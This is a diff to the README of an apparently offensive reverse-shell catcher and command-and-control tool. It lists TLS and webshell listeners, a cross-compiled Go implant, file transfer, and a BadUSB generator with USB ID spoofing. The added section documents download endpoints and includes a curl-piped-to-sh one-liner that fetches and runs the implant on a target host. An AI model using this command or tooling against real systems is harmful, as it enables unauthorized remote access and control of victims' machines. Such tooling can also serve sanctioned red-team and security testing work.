@@ -12,7 +12,20 @@ A single-host, multi-transport reverse-shell catcher with a browser dashboard.
   - TLS reverse-shell listener
   - HTTP webshell beacon transport
   - multiplexed WebSocket/protobuf implant protocol with a Go client
-- **Dashboard:** live session list with a full PTY terminal (resize + mouse support), one-click offline-session cleanup, a live in-memory event log, copyable payload examples, a BadUSB / DuckyScript generator, per-host file transfer, a native file-system browser, and HTTP CONNECT proxy controls.
+- **Dashboard:**
+  - live session list with a full PTY terminal (resize + mouse support)
+  - one-click offline-session cleanup
+  - session scrollback download
+  - live in-memory event log
+  - copyable payload examples (raw TCP, TLS, webshell, mux)
+  - BadUSB / DuckyScript generator with OS/arch target, VID/PID spoofing, and pre-payload delay
+  - per-host file transfer (upload + download)
+  - native file-system browser with directory navigation
+  - HTTP CONNECT proxy controls
+  - command palette (`Ctrl+K`) to jump to hosts/sessions
+  - browser notifications for new sessions
+  - keyboard help overlay (`?`)
+  - resizable sidebar and log panels
 - **Auth:** session-cookie login; protects the dashboard, REST API, and browser-facing WebSocket endpoints.
 - **Build panel:** cross-compile the Go mux client from the dashboard with the server URL baked in — supports linux/darwin/windows × amd64/arm64, plus armv7 (Luckfox/Shark Jack) and mipsle soft-float (MT7628).
 
@@ -159,6 +172,17 @@ RSL_SERVER=ws://other:8080/mux ./rsl-client   # override at runtime
 Available targets: `linux-amd64`, `linux-arm64`, `linux-arm-7`,
 `linux-mips-softfloat`, `linux-mipsle-softfloat`, `linux-386`,
 `darwin-arm64`, `darwin-amd64`, `windows-amd64`, `windows-arm64`.
+
+### Download endpoints
+
+`/dl?token=...&os=...&arch=...` cross-compiles and returns the Go client binary.
+`/dl/s?token=...&os=...` returns a tiny one-liner script that curls `/dl` and
+runs the binary, useful when the target can type only a short command:
+
+```bash
+# Linux/macOS target
+curl -sL 'https://rsl.example.com/dl/s?token=YOUR_BUILD_TOKEN&os=linux' | sh
+```
 
 ## Cross-compiling the Go client manually
 
